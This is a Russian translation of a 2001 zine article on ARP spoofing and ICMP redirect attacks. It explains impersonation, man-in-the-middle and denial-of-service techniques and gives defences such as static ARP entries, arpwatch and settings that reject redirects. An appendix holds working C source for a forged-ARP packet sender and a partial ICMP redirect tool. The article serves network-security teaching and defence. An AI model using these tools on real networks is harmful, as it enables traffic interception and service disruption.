
                             in name of zero

                       INOZ, issue #1, 20 nov. 2001


            Перенаправление пакетов в протоколах ARP and ICMP

                                      by Yuri Volobuyev & SOLDIER // UINC

                                                Это баг и это особенность
                         (There're bugs and there're features - оригинал)

  Как это часто бывает, различия неотличимы. Я рассматриваю 2 официальных
 протокола   модели   TCP/IP-ARP   и  ICMP,  которые  будучи  внимательно
 рассмотрены, могут использоваться для достижения определённых целей.

  Варианты  атаки,  рассматриваемые в данном документе, включают спуффинг
 (spoofing-подмена   одного  из  участников  сетевого  соединения,  прим.
 переводчика)  и DoS (Denial Of Service - отказ в обслуживании). IP-blind
 spoofing  (я бы перевёл как слепая подмена IP-адреса) - наиболее общий и
 очень  мощный  способ  атаки,  требующий  больших  усилий  и  являющийся
 достаточно  сложным  в  части реализации. В отличие от него ARP-спуффинг
 достаточно прост.

  Поскольку  ARP-spoofing  возможен  только в локальной сети, он является
 очень  серьёзным  способом  для расширения границ сетевой атаки в случае
 получения доступа к одной из машин сети.

                        [--Основы протокола ARP--]

  Автор  пишет,  что  он  мог  бы углубиться в описание протокола ARP, но
 вместо  этого  рекомендует книгу W.Richard Stevens "TCP/IP Illustrated".
 (Прим.   переводчика  -  ZDNC  довольно  подробно  описал  нюансы  этого
 протокола в своей статье). Протокол описан в RFC826.

                     [--Описание реализации атаки--]

        Давайте представим гипотетическую сеть.

 IP         10.0.0.1    10.0.0.2   10.0.0.3    10.0.04
 hostname     CAT         RAT        DOG         BAT
 hwaddr      AA:AA       BB:BB      CC:CC       DD:DD (для упрощения)

  Все  машины соединены простейшим способом (коаксиал, нет коммутаторов и
 интеллектуальных  концентраторов).  Вы  находитесь  на машине CAT рутом.
 Ваша  задача - стать для остальных клиентов сети машиной DOG. Вы знаете,
 что  DOG  доверяет хосту RAT, так что Ваша задача - подставить в сетевом
 протоколе свою машину вместо RAT.

  Первая  мысль, которая приходит в голову - "почему я не могу установить
 IP-адрес  другой  машины и..." Но это не будет работать, по крайней мере
 это не будет работать надёжно. Если Вы скажете Ethernet-драйверу на CAT,
 что  его  IP-адрес 10.0.0.2, он станет отвечать ARP-ответами на этот IP.
 Но  таким  же  образом  будет  себя  вести  и  RAT. В данной ситуации не
 выиграет  никто (в том числе и Вы). Подобная ситуация случается иногда в
 локальной  сети  при  неправильной  сетевой конфигурации машины (если ей
 назначается  работающий IP-адрес). Многие сетевые программы (в том числе
 анализаторы  сетевого  траффика) моментально обнаруживают подобные вещи.
 Кроме того на консоли сетевого администратора может появиться сообщение,
 что  такой-то  MAC  использует такой-то IP. То есть Вы не достигли того,
 чего хотели.

  Программа   send_arp.c   (прилагаемая  к  данному  тексту)  может  быть
 использована  для решения поставленной задачи. Как видно из её названия,
 она  посылает  ARP-пакет  (ARP-ответ,  если  быть точным: как следует из
 определения протокола, ответ будет принят успешно даже если его никто не
 запрашивал)  в  сеть,  и  Вы  можете делать с данным пакетом всё, что Вы
 хотите.  Посылая  пакет  при помощи данной программы, необходимо указать
 IP-адрес источника посылки и цели атаки и их hw-адреса (MAC).

  Прежде  всего  необходимо  "заглушить" свой Ethernet-драйвер. Это можно
 сделать  при помощи команды ifconfig -arp. Разумеется, драйвер всё равно
 нуждается  в  ARP-информации (обмен пакетами ведётся на канальном уровне
 OSI-модели  посредством  включения  в заголовки пакетов MAC-адресов), но
 этого  можно  достичь,  указав  ядру  ARP-информацию  вручную при помощи
 команды  arp (8). Критическая часть нашего замысла - убедить соседей (по
 сети)  в  достоверности  передаваемой  информации.  В  случае, описанном
 здесь, Вы хотите, чтобы DOG верил, что МАС-адрес RAT на самом деле равен
 МАС-адресу  САТ  (АА:АА).  Поэтому  вы  посылаете ARP-ответ с источником
 IP-адреса 10.0.0.2, hw-адресом источника АА:АА, IP-адресом цели 10.0.0.3
 и  hw-адресом  СС:СС.  Сейчас  DOG  знает,  что  RAT-это АА:АА. ARP-кэш,
 конечно, необходимо периодически обновлять (поскольку в противном случае
 ARP-запросы  начнёт  посылать  сама машина, что не входит в наши планы).
 Периодичность часто зависит от конкретной ОС, но как выяснилось, посылки
 пакета  один  раз  в  40 сек в большинстве случаев бывает достаточно. Вы
 можете посылать пакет и чаще - это не повредит.

  Сложность  здесь  связана  с  особенностью  механизма  ARP-кэширования.
 Некоторые  ОС  (например,  LINUX)  будут  пытаться обновить кэш-таблицу,
 посылая  unicast (однонаправленные) пакеты к кэшируемым адресам. Так как
 такой  запрос,  направленный  к ИСТИННОМУ RAT может помешать нам в наших
 планах,  его  необходимо  предупредить.  Этого  можно  достичь, зафлудив
 систему,  которая  могла  послать ARP-запрос, ложными ARP-ответами таким
 образом,  что  она  никогда  не  пошлёт  ARP-запрос. Предупреждение, как
 всегда,  является  лучшим лекарством. В то время, как настоящий пакет от
 DOG  к  RAT должен быть послан, посылается ложный пакет с ARP-ответом от
 САТ. Как говорилось выше, периодичности в 40 сек. бывает достаточно.

  Итак,    процедура    довольно    простая.   "Поднимаем"   (bring   up)
 алиас-интерфейс, т.е. eth0:1 (или используем текущий, не имеет значения)
 с   IP-адресом  RAT  и  включённым  ARP-поскольку  необходимо  заполнить
 кэш-таблицу  сначала,  а это невозможно с выключенным ARP. Устанавливаем
 маршрут  для DOG через правильный интерфейс. Устанавливаем в кэш-таблице
 запись для DOG и затем отключаем ARP. Теперь у нас всё установлено.

  После  этого запускаем прилагаемую программу send_arp для DOG и для RAT
 и  теперь DOG уверен, что на самом деле Вы RAT. В дальнейшем не забываем
 периодически посылать ARP-пакеты для DOG и RAT.

  Описанная  атака  работает,  конечно,  только в локальной сети (вернее,
 граница  атаки  зависит  от  дальности  прохождения ARP-пакетов, которые
 почти  никогда  не маршрутизируются). Но интересное применение возможно,
 если  в  приведённом  выше  примере  заменить  DOG  hw-адрес на hw-адрес
 маршрутизатора.  Если  это  сработает (я не уверен, что это всегда будет
 работать,   ARP-реализация  на  маршрутизаторах  может  быть  достаточно
 глупой),  Вы  можете  легко  подменить любую машину в локальной сети для
 всего  остального  мира (Интернета, имеется в виду - прим. переводчика).
 Таким  образом целевая машина мрожет быть где угодно, но машина, которую
 Вы хотите подментить должна быть в одном с Вами сегменте сети.

  Исследования   различных   сетевых  ОС  (источник  -  книга  "Атака  на
 Интернет") выявили, что в ОС Linux при адресации к хосту, находящемуся в
 одной подсети с данным хостом, ARP-запрос передаётся, если в ARP-таблице
 отсутствует  соответствующая запись о Ethernet-адресе, и при последующих
 обращениях  к данному хосту ARP-запрос не посылается. В SunOS при каждом
 новом обращении к хосту (в том случае, если в течение некоторого времени
 обращения  не  было)  происходит  передача ARP-запроса и, следовательно,
 ARP-таблица  динамически обновляется. ОС Windows 95 ведёт себя почти как
 Linux,  за  исключением  того, что периодически (каждую минуту) посылает
 ARP-запрос   о   MAC-адресе   маршрутизатора;  в  результате  в  течение
 нескольких  минут  вся LAN с Win95 без труда берётся под контроль ложным
 ARP-сервером.  ОС  WinNT  4.0  также  использует  динамически изменяемую
 ARP-таблицу,  и  ARP-запросы  о  MAC-адресах  маршрутизатора  передаются
 каждые 5 минут.

                     [--Что ещё может быть сделано--]

  Кроме спуффинга, есть ещё большой диапазон действий, которые могут быть
 совершены  при  помощи  манипуляций  с  ARP-протоколом.  DoS  (Denial Of
 Service - отказ в обслуживании - прим. переводчика) - наиболее очевидное
 применение.  Наводняя жертву неправильными hw-адресами, можно сделать её
 полностью  "немой".  Возможно  даже  полностью  предотвратить связь этой
 машины с любой (или определённой) машиной сети (и размер ARP-кэша обычно
 достаточен   для  заполнения  ARP-информацией  всех  машин  LAN).  Также
 очевидной целью атаки могут быть маршрутизаторы. Удар по ARP-кэшу в этом
 случае также должен быть двухсторонним: обе системы - жертва и машина, с
 которой  Вы  хотите отключить связь данной машины, должны быть зафлужены
 ложными  пакетами.  В  простейшем случае в пакете должен быть установлен
 несуществующий  адрес.  Но  это  не  очень  эффективно, поскольку машина
 быстро  поймёт,  что  она  говорит  с  несуществующей  машиной  и пошлёт
 обратный   ARP-запрос.   Конечно,  послав  со  своей  стороны  следующий
 ARP-ответ,  вы  опять  "обнулите"  результат,  но  необходимо это делать
 достаточно  часто.  Более эффективный путь - наводнить жертву пакетами с
 hw-адресами  машины,  которая  "жива"  и  работает в сети. Опять же, это
 зависит  от  определённой ситуации, но очень часто случается, что жертва
 посылает  обратно  пакеты  различных  типов, которые достигают неверного
 места назначения - тогда система, принимающая пакеты, будет генерировать
 ICMP-пакеты  типа  3  "ICMP  Xxxx  Unreachable" для машины-жертвы, таким
 образом  эмулируя  соединения несколько неправильным способом. Подобного
 рода  псевдосоединения могут легко отсрочить время истечения ARP-кэша. В
 Linux, например, псевдосоединения увеличивают время истечения срока кэша
 (то  есть  время,  когда будет послан пакет на обновление кэш-таблицы) с
 обычных   1  мин.  до  10  мин.  На  это  время  большинство  (или  все)
 TCP-соединения оказываются заблокированными (screw up).

  Особый  интерес представляет так называемый "даровой (gratuitous) ARP".
 Подобная   ситуация   возникает,   если  IP-адреса  источника  и  цели в
 ARP-запросе  равны.  Это  обычно  происходит в случае широковещательного
 Ethernet-запроса.  Некоторые реализации TCP/IP-cтека определяют подобную
 ситуацию,   как  специальный  случай,  и  система  посылает  запросы  об
 обновлении информации ко всем сетевым клиентам, обновляя собственный кэш
 ARP-ответами.  В  этом случае один пакет может привести к компроментации
 всей  сети.  Хотелось  бы  отметить,  что  "даровой (gratuitous) ARP" не
 определён,  как  часть стандрата ARP, поэтому большинство производителей
 ОС не применяют его, что придаёт ему меньшую популярность.

  ARP  -  достаточно  серьёзный инструмент для всякого рода сетевых атак.
 Давайте  представим,  что  кто-то  установил  ретранслятор  (релэй), или
 тоннель  на  своей  машине  и убедил две соседние машины посылать пакеты
 друг  другу  через  Ethernet-карту ретранслятора. Если этот ретранслятор
 просто  пересылает пакеты к их настоящему месту назначения, никто ничего
 не  заметит.  Однако,  в  данной  ситуации  машина-ретранслятор способна
 модифицировать  передаваемые  данные,  что  представляет  собой довольно
 большую  угрозу  конфиденциальности  (безопасности) передаваемых данных.
 Простой   программный  фильтр  может  подставлять  2  случайных  байта в
 произвольные  моменты времени. Контрольная сумма большинства пакетов при
 этом не будет изменяться, но суммарный приходящий пакет будет искажён.

                           [--ICMP redirects--]

  Эффект,  подобный  описанному  выше  при работе с протоколом ARP, может
 быть  также  достигнут  другим  путём,  используя  законную  особенность
 протокола  ICMP,  а  именно  возможность  посылки  сообщения, требующего
 перенаправления  пакетов  при  маршрутизации.  Протокол  ICMP  (Internet
 Control Message Protocol - RFC792) предназначен для управления процессом
 передачи  IP-пакетов  и  формирования сообщений при возникновении ошибок
 при  передаче  отправителю  датаграммы. Одной из функций этого протокола
 является  управление  таблицами  маршрутизации на хостах внутри сегмента
 сети.  Сетевая  подсистема  предназначена  для работы в коммуникационной
 среде,  представляющей  собой  набор  сегментов,  связанных между собой.
 связь  между  отдельными  сегментами  достигается путём подключения их к
 хостам,  имеющим  несколько  различных  сетевых интерфейсов. Такие хосты
 (называемые   маршрутизаторами)  при  необходимости  выполняют  передачу
 данных  от  одного  сегмента  к другому (forwarding). Для сетей пакетной
 коммутации  выполнение  этой  задачи  непосредственно  связано с выбором
 маршрута  прохождения пакетов данных (routing). Для этого система хранит
 таблицы  маршрутизации,  используемые  протоколами  сетевого  уровня для
 выбора  требуемого интерфейса для передачи пакета адресату. Информация о
 маршрутах  хранится в виде 2-х таблиц, одна из которых предназначена для
 маршрутов к хостам, а вторая - для маршрутов к сетям. Посмотреть таблицы
 маршрутизации можно при помощи команд route (route -n) и netstat -rn.

  При   определении  маршрута  модель  сетевого  протокола  (IP)  сначала
 просматривает  элементы  таблицы для хостов, а затем для сетей. Если оба
 поиска   не   дают   результата,   используется   маршрут  по  умолчанию
 (обзначенный   в   таблице  в  поле  Destination  как  0.0.0.0).  Обычно
 используется  первый  найденный  маршрут.  Таким образом, порядок поиска
 обеспечивает  приоритетность маршрутов к хостам по отношению к маршрутам
 к   сетям,   что   естественно,   поскольку  первые  представлены  более
 конкретными адресами. Также маршруты подразделяются на прямые (direct) и
 косвенные  (indirect).  Маршрут  в  сеть, непосредственно подключенную к
 сетевому  интерфейсу, является прямым. Маршрут по умолчанию - косвенный,
 так  как  адресует  получателя,  расположенного  вне вне непосредственно
 доступных  сетевых  сегментов. Время жизни маршрута зависит от протокола
 верхнего  уровня. Например модуль TCP хранит маршрут на протяжении жизни
 виртуального канала (образуемого при установлении TCP-сеанса).

  Перенаправление    (изменение    маршрута)    осуществляется   функцией
 rtredirect(),  вызываемой  модулем  протокола  в  ответ  на получение от
 соседних   шлюзов  управляющих  сообщений  о  перенаправлении  маршрута.
 Динамическое   управление  маршрутизацией  изначально  задумывалось  для
 предотврещения  возможной передачи сообщений по неоптимальному маршруту,
 а  также  для повышения отказоустойчивости Сети в целом. Предполагалось,
 что  сетевой  сегмент может быть подключён не через один (как обычно), а
 через  несколько  маршрутизаторов. В этом случае адресоваться во внешнюю
 сеть  можно  через  любой из ближайших узлов. При изменении оптимального
 маршрута  или  отказе  одного  из  маршрутизаторов  необходимо изменение
 таблицы  маршрутизации в памяти операционной системы. Такое динамическое
 изменение  возложено  на  протокол ICMP. Протокол в этом случае посылает
 сообщение ICMP Redirect Message следующего формата:

 -------------------------------------------
 | 8bit Type | 8bit Code | 16bit Checksum  |
 -------------------------------------------
 | 32 bit Gateway IP                       |
 -------------------------------------------
 | Internet Header + 64 bits of Datagram   |
 -------------------------------------------

  Поля имеют значения: Type-5 (ICMP-тип-Redirect), Сode -
  0=Redirect datagrams for the Network
  1=Redirect datagrams for the Host
  2=Redirect datagrams for the Type of Service and Network
  3=Redirect datagrams for Type of Service and Host.

  Cообщения с кодами 0 и 2 не используются современными ОС.
  Сообщение  с  кодом 1 информирует хост о том, что следует создать новый
 маршрут  к  отмеченному  в  сообщении  объекту  и  внести  его в таблицу
 маршрутизации,   указывая  IP-адрес  хоста,  для  которого  нужна  смена
 маршрута  (адрес  будет  занесён  в  поле  Destination  в пристыкованном
 IP-заголовке),  и  новый  IP  маршрутизатора, куда необходимо направлять
 пакеты  для  данного  хоста  (этот  адрес заносится в поле Gateway). Что
 касается  поля  Type  of  Service  (TOS)  в заголовке IP-пакета, оно, по
 замыслу    разработчиков    должно   было   определять   приоритет   при
 маршрутизации.  На  это поле отводится 8 бит. Различные биты представлют
 собой   значимость,   задержку,   скорость   передачи,  надёжность.  TOS
 определяет  обработку  датаграммы  при  передаче через различные сети от
 источника   к   получателю.   В   большинстве  случаев  может  оказаться
 невозможным  удовлетворить  сразу  нескольким требованиям при обработке,
 предусмотренным полем TOS.

  Cообщения  ICMP  Redirect  Message  в  нормальной  ситуации  посылаются
 маршрутизатором  по  умолчанию  к  машине  для  указания более короткого
 машрута  к  месту  назначения.  В исходном виде (RFC) оба переназначения
 маршрутов   (для   сети   и   для   хоста)  были  предложены,  но  позже
 перенаправление  для  сети не нашло применения и сейчас считается равным
 перенаправлением   маршрута   для   хоста.  Правильно  сконструированный
 ICMP-пакет,  который  прошёл  все  проверки  на достоверность (он должен
 прийти  с  маршрутизатора  по  умолчанию для точки назначения редиректа,
 новый  маршрутизатор  должен  быть  в  напрямую соединённой сети и т.д.)
 вызовет добавление в таблицу машрутизации данного хоста.

 ----------------- Добавление, включённое переводчиком. -----------------

  Согласно  книге "TCP/IP Illusrated" хост с реализацией сокетов 4.4 BSD,
 который  принял ICMP-redirect применяет некоторые правила до модификации
 таблицы  маршрутизации. Это предотвращает неправильное (и неправомерное)
 изменение   таблиц   маршрутизации.  Такие  правила  включают  следующие
 условия:
  1.   Новый   маршрутизатор   должен   находиться   на   непосредственно
 подсоединённой сети.
  2. Перенаправление должно быть с маршрутизатора по умолчанию для данной
 точки назначения.
  3.   Переназначение   не  может  быть  назначено  с  самого  хоста  как
 маршрутизатора.
  4. Вновь назначаемый маршрут должен быть непрямым маршрутом.

  Таким  образом, если Вы имеете 2 машины в одной подсети и они обе имеют
 сетевой  маршрут  для  этой  подсети,  вы  не  сможете  при  помощи ICMP
 перенаправить  маршрут  одной  через  другую.  Однако вы будете способны
 использовать перенаправление для передачи траффика, предназначенного для
 машин в другой подсети или снаружи сети.
 ------------------------------------------------------------------------

  Безопасность ICMP как протокола в данной ситуации равна нулю. Подменить
 IP-адрес   в  пакете  на  IP-адрес  маршрутизатора  достаточно  просто и
 прилагаемая   программа   icmp_redir.c   делает   это.   RFC,  в  которм
 предъявляются  требования  к  хостам,  определяет,  что  система  ДОЛЖНА
 следовать указаниям ICMP redirect, если пакет исходит от роутера. Многие
 системы  именно  так  и поступают (за исключением непатченного (vanilla)
 Linux  2.0.30,  где  этого  не  произошло и тестовых 2.0.29 и 2.0.31pre9
 Алана Кокса).

  ICMP redirect представляет большую потенциальную возможность для DoS. В
 отличии от ARP-кэша, маршруты хоста не требуют обновления со временем. И
 конечно,  в  данном  случае не требуется доступа к локальной сети, атака
 может  быть  запущена  с любого места. Таким образом, если машина-жертва
 принимает  ICMP  redirects (и пакеты могут действительно достичь её), то
 система может прекратить поддерживать связь с любым определённым адресом
 в  сети (не со всеми, но с теми, которые расположены в других физических
 сетях  с жертвой). ДНС-сервера в данном случае могут быть потенциальными
 жертвами.

  Для  выполнения  межсегментной  атаки атакующему необходимо, во-первых,
 знать  внутренний  IP  маршрутизатора,  к  которому  подключён  хост, и,
 во-вторых,    выбрать   имя   сервера,   которому   требуется   изменить
 маршрутизацию.

  Первая  проблема  - внутренний IP роутера - решается простым перебором,
 так   как  узнать  его  из  внешней  сети  не  представляется  возможным
 (traceroute дает только IP роутера во внешней сети). Так как большинство
 хостов  в  сети находится в подсетях класса С, то для осуществления этой
 атаки достаточно будет послать 254 пакета (O-й и 255-й адрес отпадают по
 вполне понятным причинам) ICMP Redirect с различными IP отправителя.

  Вторая  проблема  -  выбор  имени  (или  IP)  сервера, к которому будет
 изменена  маршрутизация. Тут можно просто посылать пакеты с IP известных
 и  часто  используемых  серверов  Internet  (поисковые  сервера, серверы
 известных фирм, IRC-сервера и т.д.)

  Эксперимент,  проведённый  авторами  книги "Атака на Интернет" показал,
 что  реализовать  вариант  удалённой  атаки  типа  ICMP Redirect удалось
 осуществить  как  межсегментно, так и внутрисегментно на ОС Linux 1.2.8,
 ОС Win95 и ОС WinNT 4.0. Остальные сетевые ОС (испытывались Linux версии
 выше  2.0.0  и CX/LAN/SX, защищённая по классу B1 UNIX), проигнорировали
 ICMP Redirect.

 ---------------- Добавление, включённое переводчиком. ------------------

  Здесь  хотелось  бы  добавить, что сам Алан Кокс в дискуссии на сервере
 BUGTRAQ  по  данной  статье  указывает,  что  Юрий неправ. ICMP redirect
 маршруты   для   хостов   всё-таки   не  постоянно  держатся  в  таблице
 маршрутизации,  а убираются через некоторе время. Однако если находиться
 на  коммутируемой  сети  (switched в оригинале) с большой сетевой маской
 (например  сети класса B), можно использовать переназначение ICMP против
 многих  хостов для добавления больше 65000 маршрутов в их таблицы. Таким
 образом  *nix-машины  просто  израсходуют  всё  доступоное  RAM.  Многие
 "десктоповые" ОС используют линейный алгоритм для поиска маршрутов.
 ------------------------------------------------------------------------

                           [--Как защититься--]

  ARP,  как  протокол  низкого  уровня  обычно скрыт от большинства людей
 (работа  протокола  -  прим.  переводчика). LAN-администраторы, конечно,
 представляют  себе механизм работы протокола, но обычно уделяют ему мало
 внимания.  Вы всегда можете исследовать содержимое ARP-таблицы используя
 команду  arp(8) в случае возникновения каких-нибудь сетевых проблемм, но
 это  не  самое  очевидное, что обычно приходит в голову. Даже M$-системы
 имеют   arp-команду  и  необходимо  помнить,  что  изучение  содержимого
 ARP-таблицы  может  помочь  в  некоторых ситуациях. Однако, если Вы цель
 атаки,  источник  которой из другой подсети, проникший через подмену ARP
 маршрутизатора,   Вам   это   ни   о  чём  не  скажет.  Просто,  таблица
 маршрутизации  хоста  может  быть  исследована  на  предмет  опознавания
 входов,   сгенерированных   ICMP   (в   большинстве  версий  route(1)они
 маркируются флагом D в поле флагов).

  Напомним, что просмотреть ARP-кэш можно командой arp -a (или -an, чтобы
 предотвратить обращение к ДНС-серверу).

  Приведённая  выше  схема ARP-атаки работает в сетях 10Base2 (коаксиал).
 Однако,  если  машины  соединены более "продвинутым" способом, используя
 некоторые  "разумные"  концентраторы  или  коммутаторы, атака может быть
 обнаружена и даже невозможна (то же самое касается и пассивных атак).

  Почему  я не остановился более подробно на ICMP-атаках? Дело в том, что
 многие  сети  имеют  очень простую структуру и поэтому нет необходимости
 для добавления чего-нибудь в таблицы маршрутизации. Во-вторых, во многих
 сетях  обычно  устанавливают  статические таблицы маршрутизации вручную,
 поэтому  зачем доверять подобное измененение ICMP? И окончательно, ввиду
 опасности  вышеописанной атаки, я даже запретил подобную ситуацию в моей
 ОС,  даже  ценой  несоблюдения  RFC1122.  Но  это  может  быть  довольно
 непросто.  На  Linux  или  любой другой ОС с открытыми кодами, это может
 быть сделано на уровне "хака" ядра. На IRIX 6.2 и возможно других версий
 это  достигается выставкой icmp_dropdirects=1 при использовании systune.
 Также  можно  достичь хорошего эффекта запретив прохождение пакетов типа
 ICMP  redirect  через  маршрутизаторы  (файрволлы).  Как это сделать для
 Linux  описывается  во  многих примерах настройки пакета ipchains (ipfw,
 iptables), также настройке фильтрации ICMP-пакетов уделено много места в
 книге  "Брандмауэры в Linux". В качестве примера хотелось бы сказать что
 в  Linux можно вообще очень просто запретить приём ICMP Redirect пакетов
 включением    в    какой-нибудь    из   стартовых   скриптов   следующей
 последовательности:

    for f in /proc/sys/net/ipv4/conf/*/accept_redirects; do
        echo 0 > &f
    done;

  Что касается операционной системы FreeBSD, то реагирование данной ОС на
 пакеты ICMP redirect перекрывается следующим образом:

 /etc/rc.conf icmp_drop_redirect="YES"

  В  ARP  мы сталкиваемся с ситуацией динамического разрешения IP-адресов
 без применения централизованного сервера. В протоколе DNS, например, при
 преобразовании  hostname-адресов  в  IP-адреса  сначала проверяется файл
 /etc/hosts  и  в  случае  отсутствия  там IP-адреса посылается запрос на
 ДНС-сервер (хотя порядок опредения можно и изменить). Я не вижу причины,
 почему  бы  также  не  поступить  в  случае  с  ARP.  Ethernet-адреса не
 изменяются  очень  часто.  Кроме  того отказ от динамического обновления
 ARP-таблицы  значительно снизит нагрузку сети. Ethernet-карта может быть
 запущена  без  включения  ARP-режима, а необходимые записи в ARP-таблицу
 могут  быть  включены  вручную.  Кроме  того,  это  уменьшит  количество
 пакетов,  передаваемых по сети. Существует также способ брать MAC-адреса
 из  файла  /etc/ethers.  Еще  существет  способ  статически  прописывать
 ARP-записи  в  ARP-кэш  при  помощи  опций -f -s команды ARP. Можно, для
 счастливых  пользователей  ОС  Linux  привести  пример  скрипта на Perl,
 который    статически    прописывает   ARP-таблицу   из   предварительно
 составленного  файла.  Данный скрипт должен запускаться ПОСЛЕ "поднятия"
 сетевых интерфейсов.

#!/usr/bin/perl
# by John Goerzen
#Program: forcehwaddr
#Program to run ARP to force certain tables.

#Specify filename to read from on command line, or read from stdin.

foreach(<>){             # For each input line...
    chomp;               # Strip if CR/LF
    if(/^#/) { next; }   # If it's a comment, skip it.
    if(((($host, $hw)=/\s*(.+?)\s+(\S+)\s*/)==2)&&
        !(/^#/)) {
        # The text between the slashes parses the input line as follows:
        # Ignore leading whitespace. (\s*)
        # Then, start matching and put it into $host($host,(.+?))
        # Skip over the whitespace after that (\s+)
        # Start matching. Continue matching until end of line or optional
        # trailing whitespace.

        # Then, the if checks to see that both a
        # host and a hardware address were matched.
        # (2 matches). If not, we skip the
        # line (assuming it is blank or invalid or something).
        # a poung sign; if so, ignore it (as a comment).

        # Otherwise, run the appropriate command:
        printf("Setting IP %-15s to hardware address %s\n",$host,$hw);
        system "/usr/sbin/arp -s $host $hw\n";
        }
}

  В состав операционной системы LINUX входит утилита arpwatch, при помощи
 которой  ARP-кэш  держит  таблицу  соответствия  MAC  и  IP-адресов.  Из
 мануала:  Arpwatch  keeps  track  for  ethernet/ip  address pairings. It
 syslogs  activity  and  reports certain changes via email. Arpwatch uses
 pcap(3) to listen for arp packets on a local ethernet interface.

  Также, для UNIX есть утилита ARP Wrap, которая предотвращает атаки типа
 АРП-спуффинга  до  выполнения  программ  (telnet, SSH). Из оригинального
 описания:
  Arpwrap  is a tool which attempts to detect ARP spoofing attacks before
 executing a unix command (such as SSH or Telnet).
 Скачать Linux-версию этой программы можно здесь:
  http://packetstormsecurity.org/linux/security/arpwrap.linux.180701.tgz
 Скачать Solaris-версию можно здесь:
  http://packetstormsecurity.org/UNIX/security/arpwrap.solaris.190701.tar.gz

==========================================================================

Приложение:

=======[send_arp.c]=======================================================
/* send_arp.c

This program sends out one ARP packet with source/target IP and Ethernet
hardware addresses suuplied by the user.  It compiles and works on Linux
and will probably work on any Unix that has SOCK_PACKET.

The idea behind this program is a proof of a concept, nothing more.  It
comes as is, no warranty.  However, you're allowed to use it under one
condition: you must use your brain simultaneously.  If this condition is
not met, you shall forget about this program and go RTFM immediately.

yuri volobuev'97
volobuev@t1.chem.umn.edu

*/

#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>

#define ETH_HW_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define ARP_FRAME_TYPE 0x0806
#define ETHER_HW_TYPE 1
#define IP_PROTO_TYPE 0x0800
#define OP_ARP_REQUEST 2

#define DEFAULT_DEVICE "eth0"

char usage[]={"send_arp: sends out custom ARP packet. yuri volobuev'97\n\
\tusage: send_arp src_ip_addr src_hw_addr targ_ip_addr tar_hw_addr\n\n"};

struct arp_packet {
        u_char targ_hw_addr[ETH_HW_ADDR_LEN];
        u_char src_hw_addr[ETH_HW_ADDR_LEN];
        u_short frame_type;
        u_short hw_type;
        u_short prot_type;
        u_char hw_addr_size;
        u_char prot_addr_size;
        u_short op;
        u_char sndr_hw_addr[ETH_HW_ADDR_LEN];
        u_char sndr_ip_addr[IP_ADDR_LEN];
        u_char rcpt_hw_addr[ETH_HW_ADDR_LEN];
        u_char rcpt_ip_addr[IP_ADDR_LEN];
        u_char padding[18];
};

void die(char *);
void get_ip_addr(struct in_addr*,char*);
void get_hw_addr(char*,char*);

int main(int argc,char** argv){

struct in_addr src_in_addr,targ_in_addr;
struct arp_packet pkt;
struct sockaddr sa;
int sock;

if(argc != 5)die(usage);

sock=socket(AF_INET,SOCK_PACKET,htons(ETH_P_RARP));
if(sock<0){
        perror("socket");
        exit(1);
        }

pkt.frame_type = htons(ARP_FRAME_TYPE);
pkt.hw_type = htons(ETHER_HW_TYPE);
pkt.prot_type = htons(IP_PROTO_TYPE);
pkt.hw_addr_size = ETH_HW_ADDR_LEN;
pkt.prot_addr_size = IP_ADDR_LEN;
pkt.op=htons(OP_ARP_REQUEST);

get_hw_addr(pkt.targ_hw_addr,argv[4]);
get_hw_addr(pkt.rcpt_hw_addr,argv[4]);
get_hw_addr(pkt.src_hw_addr,argv[2]);
get_hw_addr(pkt.sndr_hw_addr,argv[2]);

get_ip_addr(&src_in_addr,argv[1]);
get_ip_addr(&targ_in_addr,argv[3]);

memcpy(pkt.sndr_ip_addr,&src_in_addr,IP_ADDR_LEN);
memcpy(pkt.rcpt_ip_addr,&targ_in_addr,IP_ADDR_LEN);

bzero(pkt.padding,18);

strcpy(sa.sa_data,DEFAULT_DEVICE);
if(sendto(sock,&pkt,sizeof(pkt),0,&sa,sizeof(sa)) < 0){
        perror("sendto");
        exit(1);
        }
exit(0);
}

void die(char* str){
fprintf(stderr,"%s\n",str);
exit(1);
}

void get_ip_addr(struct in_addr* in_addr,char* str){

struct hostent *hostp;

in_addr->s_addr=inet_addr(str);
if(in_addr->s_addr == -1){
        if( (hostp = gethostbyname(str)))
                bcopy(hostp->h_addr,in_addr,hostp->h_length);
        else {
                fprintf(stderr,"send_arp: unknown host %s\n",str);
                exit(1);
                }
        }
}

void get_hw_addr(char* buf,char* str){

int i;
char c,val;

for(i=0;i<ETH_HW_ADDR_LEN;i++){
        if( !(c = tolower(*str++))) die("Invalid hardware address");
        if(isdigit(c)) val = c-'0';
        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
        else die("Invalid hardware address");

        *buf = val << 4;
        if( !(c = tolower(*str++))) die("Invalid hardware address");
        if(isdigit(c)) val = c-'0';
        else if(c >= 'a' && c <= 'f') val = c-'a'+10;
        else die("Invalid hardware address");

        *buf++ |= val;

        if(*str == ':')str++;
        }
}
==========================================================================

=======[icmp_redir.c]=====================================================
/* icmp_redir.c

This program sends out an ICMP host redirect packet with gateway IP supplied
by user.  It was written and tested under Linux 2.0.30 and could be rather
easily modified to work on most Unices.

The idea behind this program is a proof of a concept, nothing more.  It
comes as is, no warranty.  However, you're allowed to use it under one
condition: you must use your brain simultaneously.  If this condition is
not met, you shall forget about this program and go RTFM immediately.

yuri volobuev'97
volobuev@t1.chem.umn.edu

*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <syslog.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>

#define IPVERSION       4

struct raw_pkt {
        struct iphdr ip; /* This is Linux-style iphdr.
                            Use BSD-style struct ip if you want */
        struct icmphdr icmp;
        struct iphdr encl_iphdr;
        char encl_ip_data[8];
};

struct raw_pkt* pkt;

void die(char *);
unsigned long int get_ip_addr(char*);
unsigned short checksum(unsigned short*,char);

int main(int argc,char** argv){

struct sockaddr_in sa;
int sock,packet_len;
char usage[]={"icmp_redir: send out custom ICMP host redirect packet.  \
yuri volobuev'97\n\
usage: icmp_redir gw_host targ_host dst_host dummy_host\n"};
char on = 1;

if(argc != 5)die(usage);

